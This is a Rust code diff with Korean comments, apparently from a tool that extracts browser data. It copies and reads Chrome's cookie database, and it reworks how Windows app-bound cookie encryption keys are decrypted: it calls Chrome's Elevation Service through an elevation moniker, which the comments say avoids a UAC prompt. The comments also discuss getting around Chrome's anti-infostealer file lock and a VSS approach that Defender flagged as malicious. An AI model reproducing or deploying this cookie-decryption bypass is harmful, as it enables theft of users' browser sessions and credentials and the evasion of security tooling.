@@ -39,12 +39,7 @@ impl TempCopy {
     /// `Drop`이 붙지 않아 그대로 남는다. 고유 이름이라 다음 호출이 덮어써 회수해주지도 않는다 —
     /// 위 주석이 경계한 "실패할 때마다 쌓인다"가 정확히 이 경로다.
     fn new(src: &Path, tag: &str) -> std::io::Result<Self> {
-        static SEQ: AtomicU64 = AtomicU64::new(0);
-        let me = Self(std::env::temp_dir().join(format!(
-            "inno_creed_{tag}_{}_{}.db",
-            std::process::id(),
-            SEQ.fetch_add(1, Ordering::Relaxed)
-        )));
+        let me = Self(unique_temp_path(tag));
         std::fs::copy(src, &me.0)?;
         Ok(me)
     }
@@ -52,6 +47,17 @@ impl TempCopy {
     fn path(&self) -> &Path {
         &self.0
     }
+}
+
+/// `TempCopy`가 쓰는 것과 같은 규칙(pid + 프로세스 내 단조 카운터)의 고유 임시 경로.
+/// VSS 폴백처럼 파일을 직접 만든 뒤 `TempCopy(path)`로 감쌀 때 재사용한다.
+fn unique_temp_path(tag: &str) -> PathBuf {
+    static SEQ: AtomicU64 = AtomicU64::new(0);
+    std::env::temp_dir().join(format!(
+        "inno_creed_{tag}_{}_{}.db",
+        std::process::id(),
+        SEQ.fetch_add(1, Ordering::Relaxed)
+    ))
 }
 
 impl Drop for TempCopy {
@@ -163,7 +169,7 @@ fn chrome_user_data_dir() -> Result<PathBuf> {
     #[cfg(target_os = "windows")]
     {
         let local = std::env::var("LOCALAPPDATA")?;
-        return Ok(PathBuf::from(format!("{local}\\Google\\Chrome\\User Data")));
+        Ok(PathBuf::from(format!("{local}\\Google\\Chrome\\User Data")))
     }
     #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
     {
@@ -195,7 +201,9 @@ fn chrome_cookie_db() -> Result<PathBuf> {
 }
 
 fn read_chrome_cookies(db: &std::path::Path) -> Result<Vec<(String, Vec<u8>)>> {
-    // 잠금 회피: 복사본을 읽음. (Windows에서 Chrome 실행 중이면 배타 잠금이라 copy 실패 → Chrome 종료 필요.)
+    // 잠금 회피: 복사본을 읽음. (Windows에서 Chrome 실행 중이면 배타 잠금이라 copy 실패 → Chrome 종료 필요.
+    // 인포스틸러 대응으로 Chrome이 의도적으로 거는 잠금이라 `FileShare` 어떤 조합으로도 못 뚫는다,
+    // VSS로 우회하는 시도는 해봤으나 Defender가 그 조합 자체를 악성 패턴으로 오탐해 폐기함.)
     // 복사본 이름은 호출마다 고유하다 — 이유는 `TempCopy` 주석.
     let tmp = TempCopy::new(db, "ck")?;
     let conn = rusqlite::Connection::open(tmp.path())?;
@@ -388,7 +396,13 @@ fn keychain_password() -> Result<Vec<u8>> {
 
 /// Windows app-bound(v20) 키: `os_crypt.app_bound_encrypted_key`("APPB" 제거분)를
 /// Chrome Elevation Service(IElevator::DecryptData) COM 호출로 복호화 → 마지막 32B가 AES-256 키.
-/// Chrome 버전/보안 정책상 호출자를 거부할 수 있어(best-effort) 실패 시 Err → 상위에서 폴백.
+///
+/// **활성화는 반드시 elevation 모니커로 해야 한다.** Chrome 설치기가 이 CLSID를
+/// 레지스트리에 `Elevation`(`Enabled=1`) 플래그로 등록해두므로, 평범한
+/// `CoCreateInstance`는 액세스가 거부된다(모든 환경에서 항상 실패 — Chrome 버전과 무관).
+/// `CoGetObject("Elevation:Administrator!new:{CLSID}")`로 elevation 모니커를 통해
+/// 활성화해야 한다. Chrome 설치기가 이 CLSID를 신뢰 목록(AutoApprovalList)에
+/// 등록해두기 때문에 UAC 프롬프트 없이 통과한다.
 #[cfg(target_os = "windows")]
 fn app_bound_key(blob: &[u8]) -> Result<Vec<u8>> {
     use core::ffi::c_void;
@@ -435,14 +449,28 @@ fn app_bound_key(blob: &[u8]) -> Result<Vec<u8>> {
         vtbl: *const IElevatorVtbl,
     }
 
+    // elevation 모니커 바인딩에 쓰는 `BIND_OPTS3`(objidl.h). `cbStruct`로 버전을 알려야 해서
+    // 필드 전부(특히 크기)를 실제 구조체와 맞춰야 한다 — 대충 잘라내면 COM이 구조체를 잘못 읽는다.
+    #[repr(C)]
+    struct BindOpts3 {
+        cb_struct: u32,
+        grf_flags: u32,
+        grf_mode: u32,
+        dw_tick_count_deadline: u32,
+        dw_track_flags: u32,
+        dw_class_context: u32,
+        locale: u32,
+        p_server_info: *mut c_void,
+        hwnd: *mut c_void,
+    }
+
     #[link(name = "ole32")]
     unsafe extern "system" {
         fn CoInitializeEx(reserved: *mut c_void, co_init: u32) -> i32;
         fn CoUninitialize();
-        fn CoCreateInstance(
-            rclsid: *const Guid,
-            outer: *mut c_void,
-            ctx: u32,
+        fn CoGetObject(
+            psz_name: *const u16,
+            p_bind_options: *const BindOpts3,
             riid: *const Guid,
             ppv: *mut *mut c_void,
         ) -> i32;
@@ -477,14 +505,38 @@ fn app_bound_key(blob: &[u8]) -> Result<Vec<u8>> {
         // S_OK(0)/S_FALSE(1)만 우리가 초기화한 것 → 나중에 CoUninitialize 대상.
         let did_init = hr == 0 || hr == 1;
 
-        let mut elevator: *mut c_void = std::ptr::null_mut();
-        let hr = CoCreateInstance(
-            &CLSID_ELEVATOR,
-            std::ptr::null_mut(),
-            CLSCTX_LOCAL_SERVER,
-            &IID_IELEVATOR,
-            &mut elevator,
+        // Elevation:Administrator!new:{CLSID} — Chrome 설치기가 이 CLSID를 레지스트리에
+        // `Elevation` 플래그로 등록해두므로 평범한 CoCreateInstance는 거부된다. 이 모니커로
+        // CoGetObject를 거쳐야 활성화된다(신뢰 목록 등록 덕분에 UAC 프롬프트는 뜨지 않는다).
+        let moniker_str = format!(
+            "Elevation:Administrator!new:{{{:08X}-{:04X}-{:04X}-{:02X}{:02X}-{:02X}{:02X}{:02X}{:02X}{:02X}{:02X}}}",
+            CLSID_ELEVATOR.d1,
+            CLSID_ELEVATOR.d2,
+            CLSID_ELEVATOR.d3,
+            CLSID_ELEVATOR.d4[0],
+            CLSID_ELEVATOR.d4[1],
+            CLSID_ELEVATOR.d4[2],
+            CLSID_ELEVATOR.d4[3],
+            CLSID_ELEVATOR.d4[4],
+            CLSID_ELEVATOR.d4[5],
+            CLSID_ELEVATOR.d4[6],
+            CLSID_ELEVATOR.d4[7],
         );
+        let moniker: Vec<u16> = moniker_str.encode_utf16().chain(std::iter::once(0)).collect();
+        let bind_opts = BindOpts3 {
+            cb_struct: std::mem::size_of::<BindOpts3>() as u32,
+            grf_flags: 0,
+            grf_mode: 0,
+            dw_tick_count_deadline: 0,
+            dw_track_flags: 0,
+            dw_class_context: CLSCTX_LOCAL_SERVER,
+            locale: 0,
+            p_server_info: std::ptr::null_mut(),
+            hwnd: std::ptr::null_mut(),
+        };
+
+        let mut elevator: *mut c_void = std::ptr::null_mut();
+        let hr = CoGetObject(moniker.as_ptr(), &bind_opts, &IID_IELEVATOR, &mut elevator);
         if hr < 0 || elevator.is_null() {
             if did_init {
                 CoUninitialize();
@@ -626,9 +678,9 @@ fn firefox_profiles_dir() -> Result<PathBuf> {
     #[cfg(target_os = "windows")]
     {
         let appdata = std::env::var("APPDATA")?;
-        return Ok(PathBuf::from(format!(
+        Ok(PathBuf::from(format!(
             "{appdata}\\Mozilla\\Firefox\\Profiles"
-        )));
+        )))
     }
     #[cfg(not(any(target_os = "macos", target_os = "linux", target_os = "windows")))]
     {
